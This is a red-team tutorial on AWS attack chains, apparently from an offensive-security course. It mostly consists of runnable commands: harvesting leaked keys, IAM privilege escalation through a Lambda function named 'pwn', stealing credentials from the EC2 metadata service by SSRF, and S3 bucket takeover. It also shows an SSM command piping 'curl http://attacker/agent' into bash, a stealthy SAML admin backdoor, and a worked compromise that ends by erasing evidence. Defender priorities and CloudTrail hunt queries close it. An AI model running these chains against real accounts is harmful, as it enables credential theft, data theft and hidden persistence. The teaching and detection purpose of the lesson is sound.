# Practical AWS Attack Chains

The cloud lesson covered the surface; this is the playbook a red team actually runs once it has any AWS access. Chains: from leaked key → reachable services → data → compute → cross-account → all-account compromise.

> [!warning] Authorized engagements only
> All commands assume you own or are scoped against a target AWS account. Even read-only API calls log to CloudTrail and may be misread as malicious.

## 1. Initial AWS access — where keys come from

```terminal
# Public sources of leaked AWS keys
github search "AKIA" filename:.env
github search 'org:target "AKIA"' --json
trufflehog git --repo https://github.com/target/website
gitleaks detect --source . -v

# Snapshots / images / public buckets often hold IAM creds
aws ec2 describe-snapshots --filters Name=is-public,Values=true --owner-ids <accountid>
aws s3 ls s3://target-public-bucket/
```

## 2. Identify yourself + permissions

```terminal
aws sts get-caller-identity
# arn:aws:iam::123456789012:user/alice  →  account, user

# Enum policies attached to your principal
aws iam list-attached-user-policies --user-name alice
aws iam list-user-policies --user-name alice
aws iam get-account-authorization-details > authdb.json   # if you have iam:Get*

# Check what the *role/user* can do across services without iterating
pacu
> set_keys; import_keys default
> run iam__enum_permissions
> run iam__privesc_scan        # tries 30+ documented privesc paths
```

## 3. Privilege escalation — the documented paths

| Path | One-liner |
|------|-----------|
| `iam:CreateAccessKey` on another user | `aws iam create-access-key --user-name admin` |
| `iam:UpdateLoginProfile` | reset console password of any user |
| `iam:AttachUserPolicy` (self or others) | attach `AdministratorAccess` |
| `iam:PutUserPolicy` | inline `*:*` policy |
| `iam:PassRole + ec2:RunInstances` | launch EC2 with admin role attached |
| `iam:PassRole + lambda:CreateFunction + lambda:Invoke` | run code as admin role |
| `iam:CreatePolicyVersion` + setDefault | swap a policy used by a higher-priv role |
| `sts:AssumeRole` (where trust policy too loose) | become any over-permissive role |
| `cloudformation:UpdateStack` | swap stack template, gain whatever it deploys |

```terminal
# Classic: PassRole + Lambda
aws iam create-role --role-name evil --assume-role-policy-document file://trust.json
aws iam attach-role-policy --role-name evil --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws lambda create-function --function-name pwn \
  --role arn:aws:iam::123:role/evil \
  --runtime python3.12 --handler index.handler \
  --zip-file fileb://pwn.zip
aws lambda invoke --function-name pwn /dev/stdout
```

## 4. EC2 metadata — the SSRF payoff

```terminal
# IMDSv1 (still found, especially older AMIs)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# → temporary creds for the EC2's role

# IMDSv2 (token required) — exploitable when the SSRF can do PUT
TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -H "X-aws-ec2-metadata-token: $TOKEN" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

> [!danger] Same trick on ECS / EKS / Lambda
> `169.254.170.2` returns ECS task creds; a leaky pod with metadata enabled returns instance-profile creds. Always test for this on any in-cluster RCE.

## 5. S3 attacks

```terminal
# Discover unowned buckets via certificate transparency, dorks, leaks
nuclei -u target.com -t exposures/configs/aws-s3.yaml
aws s3 ls s3://target-backups/ --no-sign-request           # public bucket
aws s3api get-bucket-policy --bucket target-prod
aws s3api get-bucket-acl --bucket target-prod

# Bucket takeover — register a deleted bucket name from a CNAME pointer
host static.target.com
# → CNAME target-static.s3.amazonaws.com (NXDOMAIN at S3) → claim that name

# Find sensitive objects with grep at scale
aws s3 sync s3://target-bucket/ . --quiet
grep -RE 'AKIA|aws_secret|password|BEGIN PRIVATE KEY' .
```

## 6. SSM Session Manager abuse

```terminal
# If you have ssm:StartSession + the role on the EC2 has SSMManagedInstanceCore
aws ssm describe-instance-information
aws ssm start-session --target i-0abc...
# → interactive shell, no SSH key, no inbound port, fully logged but trusted

# Lateral with SendCommand
aws ssm send-command --instance-ids i-0abc... \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["curl http://attacker/agent | bash"]'
```

## 7. Cross-account / multi-account compromise

```terminal
# Find trusted accounts in role assumption policies
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument.Statement[].Principal]'

# AWS Organizations — if you control the management account, assume into ANY child
aws organizations list-accounts
aws sts assume-role --role-arn arn:aws:iam::CHILD:role/OrganizationAccountAccessRole \
  --role-session-name pivot

# Scan all accounts you can reach
prowler aws --multi-account
ScoutSuite --provider aws
```

## 8. Backdoors & persistence

| Mechanism | Detection-shy |
|-----------|---------------|
| New IAM access key on existing user | LOW — common admin action |
| Inline policy granting `sts:AssumeRole *` to a fresh principal | MEDIUM |
| Lambda + EventBridge re-creating a deleted role hourly | HIGH stealth |
| SAML provider with attacker-controlled IdP | HIGH stealth |
| Modified KMS key policy adding attacker principal | MEDIUM |
| EC2 user-data restored on reboot | LOW |

```terminal
# Stealthy: SAML federation backdoor
aws iam create-saml-provider --saml-metadata-document file://attacker_idp.xml --name Backup
aws iam create-role --role-name FedBackup --assume-role-policy-document '{
  "Statement":[{"Effect":"Allow","Action":"sts:AssumeRoleWithSAML",
    "Principal":{"Federated":"arn:aws:iam::123:saml-provider/Backup"},
    "Condition":{"StringEquals":{"SAML:aud":"https://signin.aws.amazon.com/saml"}}}]}'
aws iam attach-role-policy --role-name FedBackup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# Now you log in as ANY identity from your IdP, fully audited as 'normal' SAML.
```


![AWS Attack Lifecycle](/images/lessons/aws_attack_lifecycle_en.png)

## 9. End-to-end (real engagement shape)

```
1. Found AKIA in a public S3 (object inherited public-read).
2. STS get-caller-identity → low-priv user 'devops-bot'.
3. iam__privesc_scan → has CreatePolicyVersion on a policy attached to AdminRole.
4. Set a new default policy version with "Action":"*","Resource":"*".
5. AssumeRole AdminRole.
6. organizations list-accounts → 14 child accounts.
7. AssumeRole OrganizationAccountAccessRole on each.
8. Per child: collect cloudtrail, secrets manager, S3 with PII, RDS snapshots.
9. Drop SAML federation backdoor in management account; tear down lateral evidence.
10. Engagement report: full-org compromise from one leaked key in 4 hours.
```

## Defender priorities

1. **No long-lived keys**: enforce IAM Identity Center / SSO; rotate any remaining key on detection.
2. **Block IMDSv1** at the org level via SCPs; require IMDSv2 token + hop-limit 1.
3. **GuardDuty + CloudTrail + Config in every account, every region**.
4. **Permission boundaries** on developer roles to prevent privesc paths.
5. **Service Control Policies** at the OU level for `iam:*Policy*Version`, `iam:CreateLoginProfile`, `iam:CreateAccessKey for non-self`.
6. **Daily IAM Access Analyzer** review for principals with cross-account or external access.
7. **Stop the bucket-takeover path**: never leave a CNAME pointing to a deleted S3 origin.

## Hunt queries (CloudTrail / Athena / Sentinel)

```sql
-- Privilege escalation candidate
SELECT eventTime, userIdentity.arn, eventName, requestParameters
FROM cloudtrail_logs
WHERE eventName IN ('CreatePolicyVersion','SetDefaultPolicyVersion',
                    'AttachUserPolicy','AttachRolePolicy','PutUserPolicy',
                    'PutRolePolicy','UpdateAssumeRolePolicy','PassRole',
                    'CreateAccessKey','UpdateLoginProfile')
  AND userIdentity.type = 'IAMUser'
  AND eventTime > now() - interval '7' day;
```

```kql
// New SAML provider — extreme rarity
AWSCloudTrail
| where EventName == "CreateSAMLProvider"
| project EventTime, UserIdentity, RequestParameters, SourceIPAddress
```
